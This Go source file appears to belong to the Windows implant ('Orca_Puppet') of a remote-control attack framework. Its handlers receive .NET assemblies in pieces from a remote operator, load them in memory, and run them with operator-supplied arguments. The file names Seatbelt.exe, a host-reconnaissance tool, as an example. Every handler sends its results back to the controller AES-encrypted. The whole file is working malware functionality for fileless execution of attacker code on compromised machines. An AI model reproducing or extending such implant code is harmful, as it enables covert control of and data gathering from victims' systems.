//go:build windows
// +build windows

package controller

import (
	"Orca_Puppet/cli/cmdopt/assemblyopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"encoding/json"
	"runtime"
	"strings"
	"time"
)

func assemblyLoadCmd(sendUserId, decData string) {
	if assemblyopt.Assemblies == nil {
		assemblyopt.Assemblies = make(map[string]assemblyopt.Assembly)
	}
	// 获取id对应的管道
	m, exist := setchannel.GetFileSliceDataChan(sendUserId)
	if !exist {
		m = make(chan interface{})
		setchannel.AddFileSliceDataChan(sendUserId, m)
	}
	defer setchannel.DeleteFileSliceDataChan(sendUserId)
	// 获取程序集元信息
	var assemblyMetaInfo assemblyopt.AssemblyMetaInfo
	err := json.Unmarshal([]byte(decData), &assemblyMetaInfo)
	if err != nil {
		return
	}
	filename := assemblyMetaInfo.FileName
	sliceNum := assemblyMetaInfo.SliceNum
	// 循环从管道中获取程序集元数据并写入
	var peBytes []byte
	for i := 0; i < sliceNum+1; i++ {
		select {
		case metaData := <-m:
			peBytes = append(peBytes, metaData.([]byte)...)
		case <-time.After(3 * time.Second):
			return
		}
	}
	result := assemblyopt.LoadAssembly(filename, peBytes)
	if result.Stderr == "" {
		data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "successfully loaded "+filename+" into the default AppDomain")
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyLoad_ret", outputMsg)
	} else {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, result.Stderr)
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "assemblyLoad_ret", outputMsg)
	}
	debug.DebugPrint(result.Stdout)
}

func assemblyListCmd(sendUserId string) {
	assemblyNames := assemblyopt.GetAssemblyNames(assemblyopt.Assemblies)
	jsonData, _ := json.Marshal(assemblyNames)
	data, _ := crypto.Encrypt(jsonData, []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyList_ret", data)
}

func assemblyInvokeCmd(sendUserId, decData string) {
	var args []string
	json.Unmarshal([]byte(decData), &args)
	if len(args) == 0 {
		out := colorcode.OutputMessage(colorcode.SIGN_ERROR, "Please enter the parameters of the assembly, eg: Seatbelt.exe -group=system")
		data, _ := crypto.Encrypt([]byte(out), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
		return
	}
	assemblyName := strings.ToLower(args[0])
	exist := assemblyopt.IsAssemblyLoaded(assemblyName)

	if !exist {
		outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, " the "+assemblyName+" assembly is not loaded")
		data, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
		return
	}
	result := assemblyopt.InvokeAssembly(args)
	if result.Stdout == "" {
		if result.Stderr != "" {
			outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, result.Stderr)
			data, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
		} else {
			outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, "assembly invoke fail")
			data, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
		}
		return
	}
	out := util.ConvertByte2String([]byte(result.Stdout), "GB18030")
	data, _ := crypto.Encrypt([]byte(out), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "assemblyInvoke_ret", data)
	debug.DebugPrint(result.Stdout)
}

func assemblyClearCmd(sendUserId string) {
	runtime.GC()
	for k, _ := range assemblyopt.Assemblies {
		runtime.GC()
		delete(assemblyopt.Assemblies, k)
	}
	runtime.GC()
	assemblyopt.Assemblies = nil
	runtime.GC()
}
